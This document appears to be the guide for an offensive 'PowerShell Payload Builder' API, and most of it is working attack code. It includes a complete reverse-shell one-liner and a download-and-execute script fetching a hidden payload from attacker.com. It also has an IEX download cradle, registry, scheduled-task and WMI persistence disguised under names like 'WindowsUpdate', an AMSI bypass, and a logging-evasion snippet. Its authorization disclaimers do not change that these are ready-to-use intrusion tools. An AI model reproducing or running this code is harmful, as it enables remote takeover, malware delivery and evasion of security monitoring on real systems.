# PowerShell Payload Builder - Complete Guide

## Overview

The enhanced Payload Builder now generates **full, production-ready PowerShell scripts** with proper structure, error handling, and advanced features - not just one-liners.

## Features

### ✅ What's New

- **Full PowerShell Scripts**: Complete .ps1 files with functions and error handling
- **Configuration Variables**: Easy-to-modify parameters at the top of scripts  
- **Error Handling**: Try/catch blocks for robust execution
- **Multiple Payload Types**: Reverse shells, download/execute, persistence methods
- **Usage Instructions**: Clear instructions on how to execute each payload
- **Legal Warnings**: Proper disclaimers on all payloads

## Payload Types

### 1. PowerShell Reverse Shell (Full Script)

**Endpoint**: `POST /api/vulnerability/exploitation/payload`

**Type**: `reverse-shell-powershell`

**Features**:
- Complete function-based implementation
- Configuration variables ($LHOST, $LPORT)
- TCP client connection with proper stream handling
- Interactive command loop with prompt
- Error handling and connection cleanup
- System information banner (hostname, username, path)

**Request**:
```json
{
  "type": "reverse-shell-powershell",
  "options": {
    "lhost": "192.168.1.100",
    "lport": 4444
  }
}
```

**Response**:
```json
{
  "type": "reverse-shell-powershell",
  "format": "powershell",
  "payload": "# PowerShell Reverse Shell\n# Generated: 2024-01-05...\n\n$LHOST = \"192.168.1.100\"\n$LPORT = 4444\n\nfunction Invoke-ReverseShell {...}",
  "usage": "Save as reverse-shell-powershell.ps1 and execute:\n  powershell -ExecutionPolicy Bypass -File reverse-shell-powershell.ps1",
  "timestamp": "2024-01-05T12:00:00.000Z",
  "warning": "FOR AUTHORIZED TESTING ONLY..."
}
```

**Generated Script Structure**:
```powershell
# PowerShell Reverse Shell
# Generated: 2024-01-05T12:00:00.000Z
# Target: 192.168.1.100:4444
# WARNING: FOR AUTHORIZED TESTING ONLY

# Configuration
$LHOST = "192.168.1.100"
$LPORT = 4444

# Function to establish reverse shell connection
function Invoke-ReverseShell {
    param(
        [string]$Host,
        [int]$Port
    )
    
    try {
        # Create TCP client
        $client = New-Object System.Net.Sockets.TCPClient($Host, $Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        # ... full implementation with error handling
    } catch {
        Write-Error "Connection failed: $($_.Exception.Message)"
    }
}

# Execute the reverse shell
Invoke-ReverseShell -Host $LHOST -Port $LPORT
```

**Usage**:
1. Save payload to `shell.ps1`
2. Execute: `powershell -ExecutionPolicy Bypass -File shell.ps1`
3. Or copy/paste into PowerShell console

### 2. PowerShell Download & Execute

**Type**: `powershell-download-execute`

**Features**:
- Downloads file from URL to temp directory
- Optional proxy configuration
- Hidden window execution
- Automatic cleanup after execution
- Error handling

**Request**:
```json
{
  "type": "powershell-download-execute",
  "options": {
    "url": "http://attacker.com/payload.exe",
    "proxy": "http://proxy:8080",
    "arguments": "/silent /install",
    "hidden": true,
    "cleanup": true
  }
}
```

**Generated Script**:
```powershell
# PowerShell Download & Execute
# URL: http://attacker.com/payload.exe
# WARNING: FOR AUTHORIZED TESTING ONLY

$url = "http://attacker.com/payload.exe"
$output = "$env:TEMP\payload_12345.exe"

try {
    Write-Host "[+] Downloading payload from $url"
    $webClient = New-Object System.Net.WebClient
    $webClient.Proxy = New-Object System.Net.WebProxy("http://proxy:8080")
    $webClient.DownloadFile($url, $output)
    
    Write-Host "[+] Executing payload: $output"
    Start-Process -FilePath $output -ArgumentList "/silent /install" -WindowStyle Hidden
    
    Start-Sleep -Seconds 5
    Remove-Item -Path $output -Force
    
    Write-Host "[+] Payload executed successfully"
} catch {
    Write-Error "Failed: $($_.Exception.Message)"
}
```

### 3. PowerShell Persistence

**Type**: `powershell-persistence`

**Methods Available**:

#### A. Registry Run Key
**Options**: `{ "method": "registry" }`

```powershell
# Adds payload to registry run key for autostart
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "C:\payload.exe"
```

#### B. Scheduled Task
**Options**: `{ "method": "scheduledTask", "trigger": "AtLogon" }`

```powershell
# Creates scheduled task for persistence
$action = New-ScheduledTaskAction -Execute "C:\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger
```

#### C. WMI Event Subscription
**Options**: `{ "method": "wmi" }`

```powershell
# Creates WMI event subscription (stealthiest method)
$filter = ([wmiclass]"\\localhost\root\subscription:__EventFilter").CreateInstance()
$consumer = ([wmiclass]"\\localhost\root\subscription:CommandLineEventConsumer").CreateInstance()
# ... full WMI persistence implementation
```

**Request Example**:
```json
{
  "type": "powershell-persistence",
  "options": {
    "method": "scheduledTask",
    "taskName": "WindowsDefender",
    "payloadPath": "C:\\Windows\\System32\\payload.exe",
    "trigger": "Daily"
  }
}
```

### 4. PowerShell One-Liner

**Type**: `powershell-oneliner`

**Features**:
- Compact single-line version
- Suitable for direct command execution
- Hidden window, no profile, bypass execution policy

**Request**:
```json
{
  "type": "powershell-oneliner",
  "options": {
    "lhost": "10.0.0.1",
    "lport": 443
  }
}
```

**Generated**:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Additional Payload Types

### Shell Payloads
- `reverse-shell-bash`: Bash reverse shell
- `reverse-shell-python`: Python reverse shell
- `reverse-shell-php`: PHP reverse shell
- `reverse-shell-perl`: Perl reverse shell
- `reverse-shell-ruby`: Ruby reverse shell
- `reverse-shell-nc`: Netcat reverse shell

### Web Shells
- `web-shell-php`: PHP web shell
- `web-shell-jsp`: JSP web shell
- `web-shell-aspx`: ASP.NET web shell

### Injection Payloads
- `sql-injection-union`: SQL UNION injection
- `sql-injection-error`: SQL error-based injection
- `sql-injection-blind`: SQL blind injection
- `xss-basic`: Basic XSS payload
- `xss-img`: Image XSS payload
- `xss-svg`: SVG XSS payload
- `xxe-injection`: XXE injection
- `ldap-injection`: LDAP injection
- `command-injection`: Command injection

## API Usage Examples

### cURL
```bash
# Generate PowerShell reverse shell
curl -X POST http://localhost:3001/api/vulnerability/exploitation/payload \
  -H "Content-Type: application/json" \
  -d '{
    "type": "reverse-shell-powershell",
    "options": {
      "lhost": "192.168.1.100",
      "lport": 4444
    }
  }'

# Generate download & execute
curl -X POST http://localhost:3001/api/vulnerability/exploitation/payload \
  -H "Content-Type: application/json" \
  -d '{
    "type": "powershell-download-execute",
    "options": {
      "url": "http://attacker.com/payload.exe",
      "hidden": true,
      "cleanup": true
    }
  }'

# Generate persistence
curl -X POST http://localhost:3001/api/vulnerability/exploitation/payload \
  -H "Content-Type: application/json" \
  -d '{
    "type": "powershell-persistence",
    "options": {
      "method": "scheduledTask",
      "taskName": "BackupService",
      "trigger": "AtLogon"
    }
  }'
```

### JavaScript
```javascript
const axios = require('axios');

async function generatePayload() {
  const response = await axios.post('http://localhost:3001/api/vulnerability/exploitation/payload', {
    type: 'reverse-shell-powershell',
    options: {
      lhost: '192.168.1.100',
      lport: 4444
    }
  });
  
  console.log('Payload:', response.data.payload);
  console.log('Usage:', response.data.usage);
}

generatePayload();
```

### Python
```python
import requests

response = requests.post('http://localhost:3001/api/vulnerability/exploitation/payload', json={
    'type': 'reverse-shell-powershell',
    'options': {
        'lhost': '192.168.1.100',
        'lport': 4444
    }
})

payload_data = response.json()
print(f"Type: {payload_data['type']}")
print(f"Format: {payload_data['format']}")
print(f"Payload:\n{payload_data['payload']}")

# Save to file
with open('shell.ps1', 'w') as f:
    f.write(payload_data['payload'])
```

## Execution Methods

### Method 1: Save and Execute
```powershell
# Save payload to file
# Execute with bypass
powershell -ExecutionPolicy Bypass -File payload.ps1
```

### Method 2: Direct Execution
```powershell
# Copy payload content
# Paste into PowerShell console
# Or use Invoke-Expression
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

### Method 3: Encoded Execution
```powershell
# Base64 encode the script
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)

# Execute encoded
powershell -EncodedCommand $encoded
```

## Security Considerations

### Detection Evasion
- Use `-WindowStyle Hidden` to hide windows
- Use `-NoProfile` to avoid profile scripts
- Use `-NonInteractive` for non-interactive execution
- Use `-ExecutionPolicy Bypass` to bypass restrictions

### AMSI Bypass (Advanced)
```powershell
# Add AMSI bypass to beginning of scripts if needed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Logging Evasion
```powershell
# Disable script block logging
$settings = [System.Management.Automation.ScriptBlock].GetField('signatures', 'NonPublic,Static').GetValue($null)
$settings['SYSTEM'] = @{}
```

## Best Practices

1. **Always Test in Safe Environment**: Test payloads in isolated lab before deployment
2. **Use Proper Authorization**: Ensure written permission for all testing
3. **Document Everything**: Keep records of what was tested and when
4. **Clean Up**: Remove persistence mechanisms after testing
5. **Secure Storage**: Protect generated payloads with encryption
6. **Legal Compliance**: Follow all applicable laws and regulations

## Legal Warning

⚠️ **CRITICAL**: All payloads generated are FOR AUTHORIZED SECURITY TESTING ONLY.

Unauthorized use of these tools against systems you don't own or have explicit permission to test is:
- **ILLEGAL** in most jurisdictions
- **CRIMINAL** offense with severe penalties
- **UNETHICAL** and harmful

Always ensure you have:
- Written authorization from system owner
- Defined scope of testing
- Incident response plan
- Legal counsel review

## Support

For issues or questions:
- Check API documentation: `/api/vulnerability/exploitation/payload`
- Review server logs: `logs/cyberrecon.log`
- Consult README.md for general information

---

**Last Updated**: January 5, 2024
**Version**: 2.0.0 (Enhanced PowerShell Builder)
